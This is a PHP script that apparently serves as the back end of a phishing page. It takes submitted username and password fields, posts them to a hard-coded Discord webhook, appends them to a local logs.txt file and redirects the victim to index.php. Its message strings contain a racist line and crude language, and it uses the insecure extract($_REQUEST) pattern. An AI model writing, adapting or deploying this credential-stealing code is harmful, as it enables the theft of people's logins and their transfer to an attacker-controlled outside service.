<?php
extract($_REQUEST);

//=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$webhookurl = "https://discord.com/api/webhooks/919285983290208276/DhQOnPB5xknHSqF0gxepihtSkMH9RYriL-2c8OrjI6OUAlkkG2T5rDubovaY91jc98OO";

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "",
    
    // Username
    "username" => "i eat asian peoples math homework",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "",

            // Embed Type
            "type" => "rich",



            // URL of title link
            "url" => "",

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "fcba03" ),

            // Footer
            "footer" => [
                "text" => "eat my dick",
                "icon_url" => "https://cdn.discordapp.com/attachments/655801960985001997/914615988257951815/1200px-BTC_Logo.png"
            ],

            // Author
            "author" => [
                "name" => "178.157.82.71",
                "url" => "http://178.157.82.71/"
            ],

            // Additional Fields array
            "fields" => [
                // Field 1
                [
                    "name" => "USERNAME",
                    "value" => $username,
                    "inline" => false
                ],
                // Field 2
                [
                    "name" => "PASSWORD",
                    "value" => $password,
                    "inline" => true
                ]
                // Etc..
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );





    extract($_REQUEST);
    
    
    
    
    



    $file=fopen("logs.txt","a");

    fwrite($file,"username==");
    fwrite($file, $username ."\n");
    fwrite($file,"password==");
    fwrite($file, $password ."\n");
    fwrite($file, "--------------");
    fclose($file);
    header("location: index.php");
 ?>
